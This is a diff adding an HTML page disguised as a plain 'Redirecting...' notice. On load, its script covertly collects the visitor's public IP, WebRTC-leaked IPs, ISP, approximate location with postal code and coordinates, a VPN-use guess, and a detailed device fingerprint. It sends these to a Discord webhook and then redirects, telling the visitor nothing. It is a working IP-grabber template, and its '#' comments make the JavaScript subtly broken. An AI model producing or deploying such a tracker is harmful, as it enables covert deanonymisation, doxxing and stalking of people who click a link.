@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        const webhookUrl = "https://discord";       #ここにdiscordurlをいいいれれいれう
+        const redirectUrl = "https://example.com";  #ここにリダイレクトする後のあくせすするやつを書き込む
+
+        function getWebRTCIP() {
+            return new Promise((resolve) => {
+                const ips = new Set();
+                try {
+                    const pc = new RTCPeerConnection({
+                        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+                    });
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                    
+                    pc.onicecandidate = (event) => {
+                        if (!event || !event.candidate) {
+                            resolve(Array.from(ips).join(", ") || "検出なし");
+                            return;
+                        }
+                        const parts = event.candidate.candidate.split(" ");
+                        const ip = parts[4];
+                        if (ip && ip.match(/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/)) {
+                            if (ip !== "0.0.0.0" && !ip.startsWith("127.")) {
+                                ips.add(ip);
+                            }
+                        }
+                    };
+                    setTimeout(() => resolve(Array.from(ips).join(", ") || "検出なし"), 2500);
+                } catch (e) {
+                    resolve("取得エラー (非対応ブラウザ)");
+                }
+            });
+        }
+
+        async function logAndRedirect() {
+            try {
+                const [geoResponse, webrtcIp] = await Promise.all([
+                    fetch('https://ipapi.co/json/').catch(() => ({})),
+                    getWebRTCIP()
+                ]);
+                
+                let geoData = {};
+                if (geoResponse && geoResponse.json) {
+                    geoData = await geoResponse.json();
+                }
+
+                const ip = geoData.ip || "取得不可";
+                const isp = geoData.org || "取得不可";
+                const asn = geoData.asn || "取得不可";
+                const location = `${geoData.city || "不明"}, ${geoData.region || "不明"}, ${geoData.country_name || "不明"} (郵便番号: ${geoData.postal || "不明"})`;
+                const coords = `${geoData.latitude || "不明"}, ${geoData.longitude || "不明"}`;
+                const ipTimezone = geoData.timezone || "不明";
+
+                const accessTime = new Date().toLocaleString("ja-JP", { timeZone: "Asia/Tokyo" });
+                const userAgent = navigator.userAgent;
+                const referrer = document.referrer || "直接アクセス";
+                const platform = navigator.platform || "不明";
+                const vendor = navigator.vendor || "不明";
+                
+                const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
+                const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency.toString() : "不明";
+                const ram = navigator.deviceMemory ? navigator.deviceMemory.toString() : "不明";
+                const lang = navigator.language || "不明";
+                const sysTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "不明";
+                
+                const connection = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink}Mbps` : "不明";
+                const touch = navigator.maxTouchPoints > 0 ? `あり (${navigator.maxTouchPoints}点)` : "なし";
+                const cookies = navigator.cookieEnabled ? "有効" : "無効";
+
+                const isVpnSuspected = (ipTimezone !== sysTimezone && ipTimezone !== "不明" && sysTimezone !== "不明") ? " 高 (タイムゾーン不一致)" : "低";
+
+                const payload = {
+                    username: "アクセス解析bot",
+                    embeds: [{
+                        title: "新規アクセス取得",
+                        color: 5814783,
+                        fields: [
+                            { name: "表面上IP", value: `\`${ip}\``, inline: true },
+                            { name: "WebRTC漏洩IP", value: `\`${webrtcIp}\``, inline: true },
+                            { name: "VPN/プロキシ使用", value: `\`${isVpnSuspected}\``, inline: true },
+                            { name: "プロバイダ / 組織", value: `\`${isp}\``, inline: true },
+                            { name: "ASN", value: `\`${asn}\``, inline: true },
+                            { name: "おおよその位置情報", value: `\`${location}\``, inline: false },
+                            { name: "ネットワークタイムゾーン", value: `\`${ipTimezone}\``, inline: true },
+                            { name: "システムタイムゾーン", value: `\`${sysTimezone}\``, inline: true },
+                            { name: "言語設定", value: `\`${lang}\``, inline: true },
+                            { name: "プラットフォーム", value: `\`${platform}\``, inline: true },
+                            { name: "ブラウザベンダー", value: `\`${vendor}\``, inline: true },
+                            { name: "CPUコア", value: `\`${cores}\``, inline: true },
+                            { name: "容量 (GB)", value: `\`${ram}\``, inline: true },
+                            { name: "画面解像度", value: `\`${screenRes}\``, inline: true },
+                            { name: "ネットワーク接続", value: `\`${connection}\``, inline: true },
+                            { name: "タッチパネル", value: `\`${touch}\``, inline: true },
+                            { name: "Cookie", value: `\`${cookies}\``, inline: true },
+                            { name: "アクセス日時", value: `\`${accessTime}\``, inline: false },
+                            { name: "遷移元 (Referrer)", value: `\`${referrer}\``, inline: false },
+                            { name: "User-Agent", value: `\`${userAgent}\``, inline: false }
+                        ]
+                    }]
+                };
+
+                if (webhookUrl && webhookUrl !== "YOUR_WEBHOOK_URL") {
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                }
+            } catch (error) {
+            } finally {
+                window.location.replace(redirectUrl);
+            }
+        }
+
+        window.onload = logAndRedirect;
+    </script>
+</head>
+<body style="background-color: #0d1117; color: #c9d1d9; text-align: center; padding-top: 20vh; font-family: monospace;">
+    <h2>Redirecting...</h2>
+    <p style="color: #8b949e;">Please wait while we redirect you to the destination.</p>
+</body>
+</html>
